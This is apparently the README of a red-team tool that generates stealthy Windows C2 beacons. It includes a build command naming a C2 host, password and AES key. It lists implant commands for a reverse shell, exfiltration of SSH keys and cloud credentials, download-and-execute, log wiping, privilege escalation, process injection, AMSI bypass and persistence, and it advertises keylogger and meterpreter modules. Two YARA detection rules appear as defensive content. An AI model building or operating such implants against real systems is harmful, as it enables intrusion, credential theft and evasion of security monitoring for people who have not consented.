# 🔥 === Black Basalt beacon-GEN v2 ===
<img width="1664" height="928" alt="image" src="https://github.com/user-attachments/assets/e76ce510-dad2-4c6c-9910-c245ff71c9f4" />

## 🔍 INFO
- **GitHub Repository: https://github.com/grisuno/beacon
- **License: GNU General Public License v3.0 (GPLv3)
- **Author**: grisun0
- **Target Platform**: Windows (x64)
- **Source Platform**: GNU/Linux 6.12 (tested on Kali)
- **Purpose**: Academic research and red teaming exercises

> ⚠️ This project is released under GPLv3. See the DISCLAIMER section for full legal terms. 

## 🔍 Overview
beacon-GEN is a next-generation Bash-based configuration engine designed to generate highly customizable, stealthy C2 beacons for offensive operations. Built as the core orchestration layer of the LazyOwn RedTeam framework, it enables red teams to dynamically configure malleable C2 profiles, AES-256 encrypted communication, multi-UA rotation, and client-side persistence logic — all through a clean, CLI-driven interface.

This script generates the foundational configuration for advanced implants that leverage, APC injection, and anti-analysis routines to evade modern EDR solutions.

Intended for ethical hacking, penetration testing, and academic research, this tool supports seamless integration into automated attack chains and red team infrastructure.


## For RedTeamers
```bash
./gen_beacon.sh \
  --target 192.168.1.50 \
  --url https://c2.ejemplo.com:8443 \
  --maleable /api/v2/submit \
  --client-id win10-pro \
  --c2-host 192.168.1.10 \
  --c2-user AdminC2 \
  --c2-pass "P@ssw0rd_Secret_2025" \
  --c2-port 8443 \
  --aes-key aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899 \
  --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  --user-agent1 "Chrome/120.0.0.0 Safari/537.36" \
  --user-agent2 "CustomAgent/1.0 (compatible)" \
  --user-agent3 "BotNet-X/2.5" \
  --output hellbird.exe
```
## For BlueTeamers

```yara
rule beacon_GEN_Config_Template {
    meta:
        author = "LazyOwn BlueTeam"
        description = "Detects beacon-GEN generated C2 configuration"
        license = "GPLv3"

    strings:
        $c2_url_macro = "C2_URL \"$URL\"" ascii wide
        $maleable_macro = "MALEABLE \"$MALEABLE\"" ascii wide
        $client_id_macro = "CLIENT_ID \"$CLIENT_ID\"" ascii wide
        $aes_key_64char = /[0-9a-f]{64}/
        $winhttp_init = "WinHttpOpen(" ascii wide
        $user_agent_var = "TRAFFIC_UAS[]" ascii wide
        $output_name = "beacon.exe" ascii wide nocase

    condition:
        all of ($c2_url_macro, $maleable_macro, $client_id_macro) and
        $aes_key_64char and $winhttp_init and $user_agent_var
}
```

```yara
rule hellbird_Runtime_Behavior {
    meta:
        author = "LazyOwn BlueTeam"
        description = "Detects runtime behavior of HELLBIRD beacon"
        reference = "https://github.com/grisuno/hellbird"

    strings:
        $nt_queue_apc = "NtQueueApcThread" ascii wide
        $create_suspended = { 6A 04 6A 00 6A 00 6A 00 6A 00 6A 00 } // CREATE_SUSPENDED
        $aes_decrypt = "AES_ECB_encrypt" ascii wide
        $registry_persistence = "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" ascii wide
        $http_post_enc = "POST /" ascii wide
        $base64_decode = "base64_decode" ascii wide

    condition:
        $nt_queue_apc and $create_suspended and $aes_decrypt and
        ($registry_persistence or $http_post_enc) and $base64_decode
}
```

![image](https://github.com/user-attachments/assets/4e114c5c-d28d-4570-9e02-6868bb838dd2)

## **Available beacon commands**:
 - **stealth_off** stop being stealthy, Disables stealth mode, allowing normal operations.
 - **stealth_on** enter ninja mode, Enables stealth mode, minimizing activity to avoid detection.
 - **download:** download:[filename] Downloads a file from the C2 to the compromised host.
 - **upload:** [filename]: Uploads a file from the compromised host to the C2.
 - **rev:** Establishes a reverse shell to the C2 using the configured port.
 - **exfil:** Exfiltrates sensitive data (e.g., SSH keys, AWS credentials, command histories).
 - **download_exec:** download_exec:[url]: Downloads and executes a binary from a URL (Linux only, stored in /dev/shm).
 - **obfuscate:** [filename]: Obfuscates file timestamps to hinder forensic analysis.
 - **cleanlogs:** Clears system logs (e.g., /var/log/syslog on Linux, event logs on Windows).
 - **discover:** Performs network discovery, identifying live hosts via ping.
 - **adversary:**[id_atomic]: Executes an adversary emulation test (MITRE ATT&CK) using downloaded atomic redteam framework scripts.
 - **softenum:** Enumerates useful software on the host (e.g., docker, nc, python).
 - **netconfig:** Captures and exfiltrates network configuration (e.g., ipconfig on Windows, ifconfig on Linux).
 - **escalatelin:** Attempts privilege escalation on Linux (e.g., via sudo -n or SUID binaries).
 - **proxy:**[listenip]:[listenport]:[targetip]:[targetport] Starts a TCP proxy redirecting traffic from listenAddr to targetAddr.
 - **stop_proxy:**[listenaddr] Stops a TCP proxy on the specified address.
 - **portscan:** Scans ports on discovered hosts and the configured rhost.
 - **compressdir:**[directory]: Compresses a directory into a .tar.gz file and exfiltrates it.
 - **sandbox:** Get info about the system if it's a sandbox or not.
 - **isvm:** Get info about the system if it's a virtual machine or not.
 - **debug:** Get info about the system if the target is debugged or not.
 - **persist:** Try to persist mechanism in the target system.
 - **simulate:** Execute a simulation of a legit web page like youtube.
 - **migrate:** Inject a payload into a suspended process and resume it. If no payload is specified, the current process is injected (self-migration).
 - **shellcode:** Download and execute a shellcode in memory. Supports multiple operative systems and formats msfvenom friendly (in windows the technique used is Early brid APC Injection).
 - **amsi:** Bypass AMSI (Anti-Malware Scan Interface) on Windows systems to evade detection by PowerShell, WMI, and other scripting engines.
 - **load_module:** load dll on Windows systems to evade detection loading in memory from an url
 - **terminate:** Terminates the implant or beacon, removing files and persistence mechanisms.

## 🔥 Modules
This beacon have load_module command you need pass a url to an dll module, for now we have 4 modules, revshell, Metasploit meterpreter, Keylogger and screenshot.
- **Reverse Shell** : gen_dll_rev.sh
- **Metasploit Meterpreter**: gen_dll.sh
- **Screenshot**: gen_dll_ss.sh
- **Keylogger**: gen_key.sh

## 🎓 Educational Purpose
This project is intended to:

- Help red teams understand modern C2 evasion techniques.
- Assist blue teams in developing better detection logic.
- Promote research into secure software design and defensive hardening.
- Demonstrate the importance of runtime analysis over static signatures.

## ⚠️ DISCLAIMER - NO WARRANTY OR LIABILITY
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

## 🔗 Links
- https://deepwiki.com/grisuno/beacon
- https://github.com/grisuno/LazyOwn
- https://grisuno.github.io/LazyOwn/
- https://www.reddit.com/r/LazyOwn/
- https://github.com/grisuno/LazyOwnBT
- https://web.facebook.com/profile.php?id=61560596232150
- https://app.hackthebox.com/teams/overview/6429
- https://app.hackthebox.com/users/1998024
- https://patreon.com/LazyOwn
- https://deepwiki.com/grisuno/ebird3
- https://deepwiki.com/grisuno/hellbird
- https://github.com/grisuno/cgoblin
- https://github.com/grisuno/gomulti_loader
- https://github.com/grisuno/ShadowLink
- https://github.com/grisuno/OverRide
- https://github.com/grisuno/amsi
- https://medium.com/@lazyown.redteam
- https://discord.gg/V3usU8yH
- https://ko-fi.com/Y8Y2Z73AV
- https://medium.com/@lazyown.redteam/the-ebird3-chronicles-when-your-calculator-gets-a-phd-in-cybercrime-and-why-thats-perfectly-cc1738a3affc
- https://github.com/grisuno/LazyOwn/archive/refs/tags/release/0.2.58.tar.gz

![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) ![Flask](https://img.shields.io/badge/flask-%23000.svg?style=for-the-badge&logo=flask&logoColor=white) [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y8Y2Z73AV)
